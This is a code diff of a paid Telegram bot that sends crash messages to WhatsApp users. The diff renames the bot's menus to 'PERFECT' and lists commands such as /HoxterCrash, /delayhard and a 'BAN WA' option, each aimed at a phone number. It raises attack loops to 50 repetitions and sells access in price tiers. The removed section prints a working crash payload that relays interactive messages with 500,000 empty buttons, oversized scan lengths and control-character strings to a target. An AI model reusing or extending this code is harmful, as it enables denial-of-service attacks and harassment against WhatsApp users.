@@ -363,8 +363,7 @@ function getCurrentDate() {
 
 function getRandomImage() {
   const images = [
-        "https://ibb.co.com/39TLHrck",
-        "https://ibb.co.com/39TLHrck",
+        "https://ibb.co.com/1GY2rnPX"
   ];
   return images[Math.floor(Math.random() * images.length)];
 }
@@ -421,8 +420,8 @@ function getPremiumStatus(userId) {
 
 function cekWaStatus(sock) {
   return sock?.user
-    ? "✅ Terhubung"
-    : "❌ Tidak Terhubung";
+    ? "Terhubung"
+    : "Tidak Terhubung";
 }
 
 //Tamat!!
@@ -485,17 +484,17 @@ bot.onText(/\/start|\/p|start|menu|rey/, async (msg) => {
   const statussender = cekWaStatus(activeSock);
   const dragon = await bot.sendPhoto(chatId, randomImage, {
     caption: `
-<blockquote>ALTHERA - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎
+<blockquote>𝙋𝙀𝙍𝙁𝙀𝘾𝙏 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎
 Script Bot WhatsApp — Gunakan secara bijak dan bertanggung jawab.
 
 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏
-𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : Althera test
-𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 0.5 BETA TEST
+𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : PERFECT
+𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 0.5
 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ridzzhalutrs
-𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎
+𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : PRIVATE AKSES
 
 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝙄𝙎𝙏𝙀𝙈
-𝙻𝚊𝚗𝚐𝚞𝚊𝚐𝚎: 𝙹𝚊𝚟𝚊𝚂𝚌𝚛𝚒𝚙𝚝
+𝙻𝚊𝚗𝚐𝚞𝚊𝚐𝚎: JavaScript
 𝚄𝚙𝚝𝚒𝚖𝚎: ${runtime}
 𝙿𝚛𝚎𝚏𝚒𝚡: /
 𝚆𝚑𝚊𝚝𝚜𝙰𝚙𝚙 𝚂𝚎𝚜𝚜𝚒𝚘𝚗: ${statussender}
@@ -511,7 +510,7 @@ Pilih Button di bawah ini ↯
          { text: "𝗕𝗨𝗚 𝗠𝗘𝗡𝗨", callback_data: "bug_show", style: "danger", icon_custom_emoji_id: "5893257006323603821" },
          ],
          [
-         { text: "ⓘ", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
+         { text: "ⓘ", callback_data: "about", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
           { text: "✧", callback_data: "tqto", style: "success", icon_custom_emoji_id: "4936468614967460670" },
           { text: "⛭", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
          ],
@@ -547,74 +546,76 @@ bot.on("callback_query", async (query) => {
     const activeSock = [...sessions.values()].find(
   (waSock) => waSock?.user
 );
-   const statussender = cekWaStatus(activeSock);
+    const statussender = cekWaStatus(activeSock);
 
     let caption = "";
     let replyMarkup = {};
 
     if (query.data === "bug_show") {
   caption = `
-<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
-<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>
-┗━━━━━━━━━━━━━━⪼
-┏━━⪼ [ 𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘 ]
-┃<b>⋅𖤓⋅ /HoxterFc - 628xx [Forclose]</b>
-┃<b>⋅𖤓⋅ /HoxterCrash - 628xx [Crash]</b>
-┃<b>⋅𖤓⋅ /BlankHxt - 628xx [BLANK]</b>
-┃<b>⋅𖤓⋅ /HoxterVip - 628xx [ DELAY FOR MURBUG]</b>
-┃<b>⋅𖤓⋅ /xspam - 628xx [ DELAY FOR MURBUG]</b>
-┃<b>⋅𖤓⋅ /delayvloid - 628xx [ DELAY HARD ]</b>
-┃<b>⋅𖤓⋅ /delayinvis -628xx [ DELAY INVIS ]</b>
-┃<b>⋅𖤓⋅ /delayhard - 628xx [ DELAY HARD ]</b>
-┗━━━━━━━━━━━━━━━━━━━━━━━━━⪼</blockquote>
+<blockquote>✦ 𝙋𝙀𝙍𝙁𝙀𝘾𝙏 — 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐
+<i>Daftar command dan informasi fitur yang tersedia.</i>
+
+┏━━⪼ [ <b>BUG ⌂ MENU</b> ]
+┃ <b>𖤓 /delayhard — 628xx [ DELAY HARD ]</b>
+┃ <b>𖤓 /test — 628xx [ FORCLOSE ]</b>
+┃ <b>𖤓 /test — 628xx [ BAN WA ]</b>
+┗━━━━━━━━━━━━━━━━━━⪼
+
+<i>✧ Use responsibly. Stay informed.</i>
+<b>PERFECT</b> — <i>EST. 2025</i></blockquote>
 `;
     replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
     } 
  
     if (query.data === "akses") {
       caption = `
-<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
-<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>
-┗━━━━━━━━━━━━━━⪼
-┏━━⪼ [ 𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨 ]
-┃<b>⋅𖤓⋅ /addbot - Add Sender</b>
-┃<b>⋅𖤓⋅ /setcd - Set Cooldown</b>
-┃<b>⋅𖤓⋅ /addprem - Add Premium</b>
-┃<b>⋅𖤓⋅ /addadmin - add admin</b>
-┃<b>⋅𖤓⋅ /deladmin - delete admin</b>
-┃<b>⋅𖤓⋅ /delprem - Delete Premium</b>
-┃<b>⋅𖤓⋅ /tiktok - Tiktok Downloader</b>
-┃<b>⋅𖤓⋅ /tourl - To Url Image/Video</b>
-┃<b>⋅𖤓⋅ /tourl2 - To Url Image</b>
-┗━━━━━━━━━━━━━━━━━━⪼</blockquote>
+<blockquote>✦ 𝙋𝙀𝙍𝙁𝙀𝘾𝙏 — 𝘼𝘾𝘾𝙀𝙎𝙎 𝘾𝙊𝙉𝙏𝙍𝙊𝙇
+<i>Pengelolaan akses dan fitur tambahan.</i>
+
+┏━━〔 <b>ACCESS MENU</b> 〕
+┃ 𖤓 /addbot     — Tambah sender
+┃ 𖤓 /setcd      — Atur cooldown
+┃ 𖤓 /addprem    — Tambah premium
+┃ 𖤓 /addadmin   — Tambah admin
+┃ 𖤓 /deladmin   — Hapus admin
+┃ 𖤓 /delprem    — Hapus premium
+┗━━━━━━━━━━━━━━━━━━
+
+<i>✧ Manage access. Keep everything organized.</i>
+<b>PERFECT</b> — <i>EST. 2025</i></blockquote>
 `;
     replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
     }
     
     if (query.data === "harga") {
       caption = `
-<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
-<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>
-┗━━━━━━━━━━━━━━⪼
-┏━━⪼ [ 𝗛𝗔𝗥𝗚𝗔 ⌂ 𝗦𝗖𝗥𝗜𝗣𝗧 ]
-┃<b>⋅𖤓⋅ FULL UP : Rp7.000</b>
-┃<b>⋅𖤓⋅ RESS SC : Rp12.000</b>
-┃<b>⋅𖤓⋅ PARTNER SC : Rp20.000</b>
-┃<b>⋅𖤓⋅ MODERATOR SC : Rp40.000</b>
-┃<b>⋅𖤓⋅ OWNER SC : Rp50.000</b>
-┃<b>⋅𖤓⋅ HOXTER STAFF : Rp70.000</b>
-┃<b>⋅𖤓⋅ HOXTER ADMIN : Rp90.000</b>
-┃<b>⋅𖤓⋅ DEV HOXTER : Rp130.000</b>
+<blockquote>✦ 𝙋𝙀𝙍𝙁𝙀𝘾𝙏 — 𝙎𝘾𝙍𝙄𝙋𝙏 𝙋𝙍𝙄𝘾𝙀
+Gunakan script secara bijak dan bertanggung jawab.
+┏━━⪼ [ 𝗦𝗖𝗥𝗜𝗣𝗧 ⌂ 𝗣𝗥𝗜𝗖𝗜𝗡𝗚 ]
 ┃
-┃<b>⋅𖤓⋅ BUY AKSES BISA KE @Fuckyatim</b>
-┗━━━━━━━━━━━━━━━━━━⪼</blockquote>
+┃ <b>⋅𖤓⋅ FULL UP : Rp5.000</b>
+┃ <b>⋅𖤓⋅ RESS SC : Rp10.000</b>
+┃ <b>⋅𖤓⋅ PARTNER SC : Rp15.000</b>
+┃ <b>⋅𖤓⋅ MODERATOR SC : Rp25.000</b>
+┃ <b>⋅𖤓⋅ OWNER SC : Rp35.000</b>
+┃ <b>⋅𖤓⋅ PERFECT STAFF : Rp45.000</b>
+┃ <b>⋅𖤓⋅ PERFECT ADMIN : Rp55.000</b>
+┃ <b>⋅𖤓⋅ DEVELOPER : Rp80.000</b>
+┃
+┃ ─────────────────
+┃ <b>⋅𖤓⋅ PEMBELIAN & AKSES</b>
+┃ Hubungi: @ridzzhalutrs
+┗━━━━━━━━━━━━━━━━━━⪼
+
+<b>PERFECT</b> — <i>EST. 2025</i></blockquote>
 `;
     replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
     }
     
     if (query.data === "tqto") {
       caption = `
-<blockquote><b>✦ ALTHERA — CONTRIBUTORS</b>
+<blockquote>✦ 𝙋𝙀𝙍𝙁𝙀𝘾𝙏 — 𝘾𝙊𝙉𝙏𝙍𝙄𝘽𝙐𝙏𝙊𝙍𝙎
 <i>Appreciation for everyone behind the project.</i>
 
 ┏━━〔 <b>THANKS TO</b> 〕
@@ -622,25 +623,64 @@ bot.on("callback_query", async (query) => {
 ┗━━━━━━━━━━━━━━━━━━
 
 <i>Thank you for your support.</i>
-<b>ALTHERA</b> — <i>INDEPENDENT PROJECT</i></blockquote>
+<b>PERFECT</b> — <i>EST. 2025</i></blockquote>
 `;
     replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
     }
 
+    if (query.data === "about") {
+      caption = `
+<blockquote>✦ <b>ALTHERA — ABOUT US</b>
+<b>Althera</b> is a WhatsApp bug bot project developed by a team, with the goal of delivering bugs to targets.
+
+┏━━〔 <b>ABOUT THE PROJECT</b> 〕
+┃ 𖤓 <b>Project</b> : PERFECT
+┃ 𖤓 <b>Category</b> : WhatsApp bug bot 
+┃ 𖤓 <b>Developer</b> : @Fuckyatim and @baba
+┗━━━━━━━━━━━━━━━━━━
+
+✧ <i>Simple. Perfect. Continuously evolving.</i>
+<b>PERFECT</b> — <i>EST. 2025</i></blockquote>
+`;
+    replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
+    }
+
+    if (query.data === "tools") {
+      caption = `
+<blockquote><b>✦ ALTHERA — TOOLS & UTILITIES</b>
+<i>Kumpulan fitur dan utilitas untuk kebutuhanmu.</i>
+
+┏━━〔 <b>TOOLS MENU</b> 〕
+┃ 𖤓 /stiktok — Cari video TikTok
+┃ 𖤓 /brat — Buat stiker brat
+┃ 𖤓 /xnxx — Cari video xnxx
+┃ 𖤓 /muslimai — Bicara dengan ai muslim
+┃ 𖤓 /cekkhodam — Cek khodam
+┃ 𖤓 /cekganteng — Cek ganteng
+┃ 𖤓 /suit — Minigame suit
+┃ 𖤓 /quotes — Quotes
+┃ 𖤓 /galaumotivasi — Motivasi
+┗━━━━━━━━━━━━━━━━━━
+
+<i>✧ Useful tools. One place.</i>
+<b>PERFECT</b> — <i>EST. 2025</i></blockquote>
+`;
+    replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
+    }
+    
     if (query.data === "back_to_main") {
       caption = ` 
-<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
-<blockquote>ALTHERA - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎
-Script Bot WhatsApp — Gunakan secara bijak dan bertanggung jawab.
+<blockquote>✦ 𝙋𝙀𝙍𝙁𝙀𝘾𝙏 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎
+<i>Script Bot WhatsApp — Gunakan secara bijak dan bertanggung jawab.</i>
 
 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏
-𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : Althera test
-𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 0.5 BETA TEST
+𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : PERFECT
+𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 0.5
 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ridzzhalutrs
-𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎
+𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : PRIVATE AKSES
 
 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝙄𝙎𝙏𝙀𝙈
-𝙻𝚊𝚗𝚐𝚞𝚊𝚐𝚎: 𝙹𝚊𝚟𝚊𝚂𝚌𝚛𝚒𝚙𝚝
+𝙻𝚊𝚗𝚐𝚞𝚊𝚐𝚎: JavaScript
 𝚄𝚙𝚝𝚒𝚖𝚎: ${runtime}
 𝙿𝚛𝚎𝚏𝚒𝚡: /
 𝚆𝚑𝚊𝚝𝚜𝙰𝚙𝚙 𝚂𝚎𝚜𝚜𝚒𝚘𝚗: ${statussender}
@@ -693,61 +733,6 @@ Pilih Button di bawah ini ↯
 ///and func
 
 
-
-
-bot.onText(/^\/tar(?:@\w+)?(?:\s|$)/, async (msg) => {
-  const chatId = msg.chat.id;
-
-  try {
-    if (msg.chat.type === "private") {
-      await bot.sendRichMessageDraft(chatId, 1, {
-        blocks: [
-          {
-            type: "thinking",
-            text: "Loading..."
-          }
-        ]
-      });
-    } else {
-      await bot.sendChatAction(chatId, "typing");
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 1500));
-
-    await bot.sendRichMessage(chatId, {
-      blocks: [
-        {
-          type: "photo",
-          photo: {
-            type: "photo",
-            media: "https://files.catbox.moe/599dfp.jpg"
-          }
-        },
-        {
-          type: "heading",
-          text: "Welcome",
-          size: 3
-        },
-        {
-          type: "divider"
-        },
-        {
-          type: "buttons",
-          buttons: [
-            {
-              text: "Channel",
-              url: "https://t.me/DasyncH"
-            }
-          ]
-        }
-      ]
-    });
-
-  } catch (error) {
-    console.error("Gagal mengirim Rich Message:", error);
-  }
-});
-
 //=======CASE BUG=========//
 bot.onText(/\/HoxterFc (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
@@ -760,8 +745,17 @@ bot.onText(/\/HoxterFc (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
-    buy akses ke owner di bawa inii !!!`,
+    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
+┏━━━━━━━━━━━━━━━━━━┓
+<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
+┗━━━━━━━━━━━━━━━━━━┛
+
+𖤓 Interested in accessing the script?
+Contact the owner below.
+
+↳ <b>Owner:</b> @Fuckyatim
+
+<b>PERFECT</b> — <i>EST. 2025</i>`,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
@@ -862,8 +856,17 @@ bot.onText(/\/HoxterCrash (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
-    buy akses ke owner di bawa inii !!!`,
+    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
+┏━━━━━━━━━━━━━━━━━━┓
+<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
+┗━━━━━━━━━━━━━━━━━━┛
+
+𖤓 Interested in accessing the script?
+Contact the owner below.
+
+↳ <b>Owner:</b> @Fuckyatim
+
+<b>PERFECT</b> — <i>EST. 2025</i>`,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
@@ -963,8 +966,17 @@ bot.onText(/\/BlankHxt (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
-    buy akses ke owner di bawa inii !!!`,
+    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
+┏━━━━━━━━━━━━━━━━━━┓
+<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
+┗━━━━━━━━━━━━━━━━━━┛
+
+𖤓 Interested in accessing the script?
+Contact the owner below.
+
+↳ <b>Owner:</b> @Fuckyatim
+
+<b>PERFECT</b> — <i>EST. 2025</i>`,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
@@ -1064,8 +1076,17 @@ bot.onText(/\/HoxterVip (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
-    buy akses ke owner di bawa inii !!!`,
+    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
+┏━━━━━━━━━━━━━━━━━━┓
+<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
+┗━━━━━━━━━━━━━━━━━━┛
+
+𖤓 Interested in accessing the script?
+Contact the owner below.
+
+↳ <b>Owner:</b> @Fuckyatim
+
+<b>PERFECT</b> — <i>EST. 2025</i>`,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
@@ -1125,8 +1146,10 @@ if (remainingTime > 0) {
     }
 
     // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 5; i++) {   
-   await wowoceombg(sock, target);
+    for (let i = 0; i <= 50; i++) {   
+   await JawaTimurForcloseRelog(sock, target);
+   await CrashUi(sock, target);
+   await CrashJnvible(sock, target);
    const delay = ms => new Promise(res => setTimeout(1500));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
@@ -1164,8 +1187,17 @@ bot.onText(/\/xspam (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
-    buy akses ke owner di bawa inii !!!`,
+    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
+┏━━━━━━━━━━━━━━━━━━┓
+<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
+┗━━━━━━━━━━━━━━━━━━┛
+
+𖤓 Interested in accessing the script?
+Contact the owner below.
+
+↳ <b>Owner:</b> @Fuckyatim
+
+<b>PERFECT</b> — <i>EST. 2025</i>`,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
@@ -1225,8 +1257,8 @@ if (remainingTime > 0) {
     }
 
     // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 2; i++) {   
-    await crashonemsg(sock, target);
+    for (let i = 0; i <= 50; i++) {   
+    await delayspam(sock, target);
    const delay = ms => new Promise(res => setTimeout(1500));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
@@ -1264,8 +1296,17 @@ bot.onText(/\/delayvloid (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
-    buy akses ke owner di bawa inii !!!`,
+    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
+┏━━━━━━━━━━━━━━━━━━┓
+<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
+┗━━━━━━━━━━━━━━━━━━┛
+
+𖤓 Interested in accessing the script?
+Contact the owner below.
+
+↳ <b>Owner:</b> @Fuckyatim
+
+<b>PERFECT</b> — <i>EST. 2025</i>`,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
@@ -1364,8 +1405,17 @@ bot.onText(/\/delayinvis (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
-    buy akses ke owner di bawa inii !!!`,
+    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
+┏━━━━━━━━━━━━━━━━━━┓
+<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
+┗━━━━━━━━━━━━━━━━━━┛
+
+𖤓 Interested in accessing the script?
+Contact the owner below.
+
+↳ <b>Owner:</b> @Fuckyatim
+
+<b>PERFECT</b> — <i>EST. 2025</i>`,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
@@ -1453,712 +1503,6 @@ if (remainingTime > 0) {
   }
 });
 
-// Pastikan bagian atas file kamu sudah punya:
-// const fs = require("fs-extra");
-// const path = require("path");
-// const os = require("os");
-// const vm = require("vm");
-
-
-// ===============================
-// TEST FUNCTIONS
-// ===============================
-
-// Isi hanya function yang memang kamu izinkan.
-// Tambahkan function lain di object ini.
-const testFunctions = {
-  test: async function Skylinne(sock, target) {
-    const LexMsg = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        imageMessage: {
-                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
-                            mimetype: "image/jpeg",
-                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
-                            fileLength: 9999,
-                            height: 9999,
-                            width: 9999,
-                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
-                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
-                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
-                            mediaKeyTimestamp: "1776937541",
-                            jpegThumbnail: null,
-                            caption: "Skylinne - Executed¿!",
-                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
-                            scanLengths: [
-                                9999999999999999999,
-                                9999999999999999999,
-                                9999999999999999999,
-                                9999999999999999999
-                            ],
-                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
-                        }
-                    },
-                    body: {
-                        text: "GhostCrasher - Executed¿!"
-                    },
-                    nativeFlowMessage: {
-                        buttons: Array.from({ length: 500000 }, () => ({}))
-                    }
-                }
-            }
-        }
-    };
-
-    const Lexca = generateWAMessageFromContent(target, LexMsg, {});
-
-    await sock.relayMessage(target, Lexca.message, {
-        participant: target,
-        messageId: Lexca.key.id
-    });
-
-    const Lexcaa = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    body: {
-                        text: "Skylinne - Executed¿!"
-                    },
-                    nativeFlowMessage: {
-                        buttons: Array.from({ length: 500000 }, () => ({}))
-                    }
-                }
-            }
-        }
-    };
-
-    const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});
-
-    await sock.relayMessage(target, Lexcaabos.message, {
-        participant: target,
-        messageId: Lexcaabos.key.id
-    });
-
-    const Msg = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    body: {
-                        text: "Skylinne - GhostCrasher",
-                    },
-                    nativeFlowMessage: {
-                        button: "\x10".repeat(2000),
-                    },
-                },
-            },
-        },
-    };
-
-    const Lex = generateWAMessageFromContent(target, Msg, {});
-
-    await sock.relayMessage(target, Lex.message, {
-        participant: target,
-        messageId: Lex.key.id
-    });
-
-    const ahk = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        imageMessage: {
-                            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
-                            mimetype: "image/jpeg",
-                            caption: "GhostCrasher - Executed¿!",
-                            fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
-                            fileLength: 9999999,
-                            height: 9999,
-                            width: 9999,
-                            mediaKey: "3q2+7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
-                            fileEncSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
-                            directPath: "/v/t62.7118-24/1234567890123456.enc?ccb=11-4&oh=abc123&oe=6A12ED53",
-                            mediaKeyTimestamp: "1746057600",
-                            jpegThumbnail: null,
-                            scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
-                            scanLengths: [
-                                9999999999999998555,
-                                9999999999999998555,
-                                9699999999999999148,
-                                9969999999999999164
-                            ],
-                            midQualityFileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
-                            contextInfo: {
-                                pairedMediaType: "PAIRED_PERMANENT",
-                                isQuestion: true,
-                                isGroupStatus: true,
-                                remoteJid: "status@broadcast",
-                                entryPointConversionDelaySeconds: 999999,
-                                entryPointConversionSource: "ctwa"
-                            }
-                        }
